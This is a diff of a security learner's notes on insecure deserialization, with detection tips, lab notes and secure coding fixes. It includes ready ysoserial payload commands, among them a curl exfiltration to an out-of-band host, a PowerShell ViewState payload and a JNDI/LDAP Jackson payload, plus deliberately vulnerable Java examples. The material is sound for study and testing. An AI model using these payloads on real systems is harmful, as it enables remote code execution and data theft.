@@ -1,119 +1,231 @@
+tactic: Initial Access
 
+**Insecure Deserialization** is when an application deserializes user-controlled data without validation, allowing an attacker to manipulate serialized objects to modify application logic, escalate privileges, or achieve RCE. Often called "property-oriented programming" (POP) when chaining gadgets.
 
+```
+Serialization: Object → bytes/string → sent to client (cookie, body, header) 
 
-# Serialization
+Deserialization: bytes/string → Object → application uses it 
 
-process of converting complex data structure  into flatter format that can be sent and received as sequential stream of byte 
+Attacker modifies the serialized data before it is deserialized The application reconstructs a malicious object and executes attacker-controlled logic
+```
 
+## Injection Points
 
-# Deserialization
+- Cookies containing serialized session objects
+- Hidden form fields with base64 encoded objects
+- `Authorization` header with serialized tokens
+- API request bodies (`Content-Type: application/x-java-serialized-object`)
+- Viewstate in .NET applications (`__VIEWSTATE` parameter)
+- Cache entries, message queues, databases storing serialized objects
+- File uploads processed by deserializers
 
-process of restoring the byte stream to a fully functional replica of the original object, in the exact state as when it was serialized.
+## Checklist
 
+### Detection
 
+- [ ]  Look for base64 blobs in cookies, headers, or body params, decode and check for serialized signatures:
 
+```
+	rO0AB...     Java serialized object (base64)
+	AC ED 00 05  Java serialized object (hex)
+	O:           PHP serialized object
+	\x80\x04\x95 Python pickle
+```
 
+- [ ]  Check cookies for serialized session data:
 
-how the object is serialized depends on the language.  some objects are serialized into binary formats noting that all of the original objects attributes are stored in the serialized data stream including private fields  to provent a field from being serielized it must be marked as transient 
+```
+	Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+```
 
+- [ ]  Look for `.NET` ViewState:
 
+```
+	__VIEWSTATE=dDw0NzM1OTM3MDc7Oz4=
+```
 
+- [ ]  Modify a simple field (e.g. username, role, isAdmin) in the serialized object and observe behaviour
+- [ ]  Use Burp Scanner, it flags Java deserialization automatically
 
-# Insecure 
+### Java Deserialization (ysoserial)
 
+- [ ]  Generate a payload with ysoserial for the detected gadget chain:
 
-Insecure deserialization is when user controllable data is deserialized by a website. trhat enable an attacker to manipulate serialized objects in order to pass harmful data into the app 
+```bash
+	java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
+```
 
-user input should never be deserialized  
+- [ ]  Common gadget chains to try:
 
-even checks on the deserialzed data is not valid since checking the data after it has been deserialized is flawed  too late
+```
+	CommonsCollections4
+	CommonsCollections6
+	Spring1
+	Spring2
+	Groovy1
+	URLDNS       (blind detection only, triggers DNS lookup)
+```
 
+- [ ]  For blind detection, use `URLDNS` chain with Burp Collaborator:
 
-its made possiblee  due to the number of dependencies that exist  in modern websites 
+```bash
+	java -jar ysoserial-all.jar URLDNS 'http://OASTIFY.com' | base64 -w 0
+```
 
-that kind of attack provides an entry point to a massevly increased attack surface.  that allows an attacker to reuse existing application code in a malicious way  often remote code execution 
+- [ ]  URL encode the payload before sending if it goes in a query param or cookie
 
+### PHP Deserialization
 
-# Identify
+- [ ]  Inspect the serialized object structure:
 
-check at all datqa being passed into the website and try to identify anything that looks like serialized data 
+```
+	O:4:"User":2:{s:4:"role";s:4:"user";s:5:"admin";b:0;}
+```
 
+- [ ]  Modify fields directly, change `role` to `admin`, flip `b:0` to `b:1`
+- [ ]  Look for magic methods in source code that get triggered on deserialization:
 
-# Format 
+```php
+	__wakeup()    triggered on deserialization
+	__destruct()  triggered when object is destroyed
+	__toString()  triggered when object used as string
+```
 
-`$user->name = "carlos"; $user->isLoggedIn = true;`
+- [ ]  Chain magic methods through the object graph to reach dangerous sinks (`eval`, `exec`, `system`, `file_put_contents`)
 
-When serialized, this object may look something like this:
+### .NET ViewState
 
-`O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`
+- [ ]  Decode `__VIEWSTATE` from base64 and check if MAC validation is disabled
+- [ ]  If no MAC, use ysoserial.net to generate payload:
 
-- `O:4:"User"` - An object with the 4-character class name `"User"`
-- `2` - the object has 2 attributes
-- `s:4:"name"` - The key of the first attribute is the 4-character string `"name"`
-- `s:6:"carlos"` - The value of the first attribute is the 6-character string `"carlos"`
-- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character string `"isLoggedIn"`
-- `b:1` - The value of the second attribute is the boolean value `true`
+```bash
+	ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -e BASE64_ENCODED_CMD"
+```
 
-there are native methods for PHP are serialize and unserialize 
+### Privilege Escalation via Object Manipulation
 
-this is a format for PHP for example Java  is more difficult to read but still we can identify serialized data, we can identify java by checking objects that always begin with the same bytes,  which are encoded as `ac ed` in hex and `ro0` in base64  basically any class  that implements ``java.io.Serializable`` 
+- [ ]  Decode the serialized session, locate role or privilege fields, modify and re-encode:
 
+```
+	PHP:  s:4:"role";s:4:"user"  →  s:5:"admin";s:5:"admin"
+	      note: update the string length prefix to match new value length
+```
 
+- [ ]  For JSON-based deserialization (Jackson, Gson), inject type confusion:
 
-# Manipulating
+```json
+	{"@class":"com.example.AdminUser","role":"admin"}
+```
 
-there are 2  approaches wen can take when manipulating serialized objects
-- edit object directly in its byte form 
-- write a script in the corresponding language to create and serialize the new object
+---
 
+## Attack Payloads
 
+**Java RCE via CommonsCollections4:**
 
-when tampering with the data as long as the attacker preserves a valid serialized object, the deserialization process will create a server side object with the modified attribute value 
+```bash
+java -jar ysoserial-all.jar CommonsCollections4 'curl http://OASTIFY.com/$(id)' | base64 -w 0
+```
 
+**Java blind detection via DNS:**
 
-example:
-``O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}``
+```bash
+java -jar ysoserial-all.jar URLDNS 'http://OASTIFY.com' | base64 -w 0
+```
 
-turn the boolean value to 1   if the source code is this 
+**PHP object injection, privilege escalation:**
 
-````
-$user = unserialize($_COOKIE); if ($user->isAdmin === true) { // allow access to admin interface }
-````
-we have admin priv 
+```
+Before: O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:4:"user";}
+After:  O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:5:"admin";}
+```
 
+**Jackson polymorphic type injection:**
 
-## Modifying data types
+```json
+["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://ATTACKER/obj","autoCommit":true}]
+```
 
-- check some flaws in the programming language used 
-- in PHP logic if you perform a loose comparison  between int and string  PHP attempts to convert string to int  this works for any alphanumeric string that starts with a number PHP will effectively conver the entire string to an integer valye based on the initial number 
--  ``0 == "Example string" // true`` 0 numerals in the string.
-- Note that this is only possible because deserialization preserves the data type. If the code fetched the password from the request directly, the `0` would be converted to a string and the condition would evaluate to `false`.
+---
 
+## White Box Testing
 
-## Magic Method
+**Vulnerable, Java native deserialization from user-controlled cookie:**
 
-methods that you do not invoke. they are invoked automatically whenever a particular event or scenario occurs one of the most common examples in PHP `__contstruct()` is invoked whenever an object of the class is instantiated. some languages have magic methods that are invoked automatically **during** the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method.
+```java
+@GetMapping("/profile")
+public ResponseEntity<?> profile(@CookieValue("session") String session) throws Exception {
+    byte[] decoded = Base64.getDecoder().decode(session);
+    ByteArrayInputStream bis = new ByteArrayInputStream(decoded);
 
-`readObject()` method declared in exactly this way acts as a magic method that is invoked during deserialization.
+    // ObjectInputStream deserializes whatever the attacker sends
+    ObjectInputStream ois = new ObjectInputStream(bis);
+    User user = (User) ois.readObject(); // RCE if a gadget chain is on the classpath
 
+    return ResponseEntity.ok(user);
+}
+```
 
-**These methods are always prefixed with double underscores (`__`)**
+**Vulnerable, Jackson deserialization with polymorphic type handling enabled:**
 
 
+```java
+ObjectMapper mapper = new ObjectMapper();
+// enables @class field in JSON, allows attacker to specify any class to instantiate
+mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
 
-### Gadget Chain 
+User user = mapper.readValue(requestBody, User.class); // attacker controls the class
+```
 
+**Vulnerable, XStream deserialization without security restrictions:**
 
-gadget that can be used to simply be to invoke a method that will pass their input into another gadget  by chaining them together that could turn into `sink gadget`
 
-what does that mean its basically a chain of code that already exist that we can invoke the magic method so what we can do something malicious 
+```java
+XStream xstream = new XStream();
+// no allowlist set, any class on the classpath can be instantiated
+Object obj = xstream.fromXML(userInput); // RCE via XStream gadget chains
+```
 
-frankly this can be possible with the source code  but we can always find a way to work with pre-build gadgets  they provide range of pre-discovered chains that have been successfully exploited on other websites 
+**Secure:**
 
-`ysoserial`  tool for java deserialization,  that lets us use gadget chains for        a lib that you think the target application is using 
+```java
+// Java, use a filter to restrict which classes can be deserialized
+ObjectInputStream ois = new ObjectInputStream(bis) {
+    @Override
+    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
+        // only allow specific safe classes
+        if (!desc.getName().startsWith("com.example.safe.")) {
+            throw new InvalidClassException("Unauthorized deserialization: " + desc.getName());
+        }
+        return super.resolveClass(desc);
+    }
+};
 
+// Or use Java 9+ deserialization filter
+ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.example.safe.*;!*");
+ois.setObjectInputFilter(filter);
 
-# Lab: Modifying serialized objects
+// Jackson, disable default typing and use strict type binding
+ObjectMapper mapper = new ObjectMapper();
+mapper.deactivateDefaultTyping(); // disable @class injection
+// bind only to the expected class, never Object or generic types
+UserDTO user = mapper.readValue(requestBody, UserDTO.class);
+
+// XStream, set an allowlist
+XStream xstream = new XStream();
+xstream.allowTypesByWildcard(new String[]{"com.example.safe.**"});
+xstream.denyTypesByWildcard(new String[]{"**"}); // deny everything else first
+
+// Prefer stateless tokens like JWT over serialized session objects in cookies
+// Never deserialize data from untrusted sources without strict type filtering
+```
+
+---
+
+## Labs 
+
+**Modifying serialized objects**
 
 
 in the cookie we found a base64 encoded   changed 0 to 1
@@ -122,23 +234,20 @@ in the cookie we found a base64 encoded   changed 0 to 1
 
 
 
-# Lab: Modifying serialized data types
+ **Modifying serialized data types**
+ 
 i is for INT and doest take size
 ```
 O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
 ```
 
-
-
-# Lab: Using application functionality to exploit insecure deserialization
+**Using application functionality to exploit insecure deserialization**
 
 ```
 O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"v3c31ff3r6q9r6cp2q8z50w8nmdgiani";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
 ```
 
-
-
-# Lab: Arbitrary object injection in PHP
+ **Arbitrary object injection in PHP**
 
 
 tilde ~ to the file name shows you the source code
@@ -147,8 +256,7 @@ GET /libs/CustomTemplate.php~
 `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`
 
 
-
-# Lab: Exploiting Java deserialization with Apache Commons
+**Exploiting Java deserialization with Apache Commons**
 
 
 `java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 `
@@ -158,8 +266,7 @@ then used sublime to basically url encode it
 
 when i used another common collection i had a result of java class not found 
 
-
-# Lab: Exploiting PHP deserialization with a pre-built gadget chain
+**Exploiting PHP deserialization with a pre-built gadget chain**
 
 
 
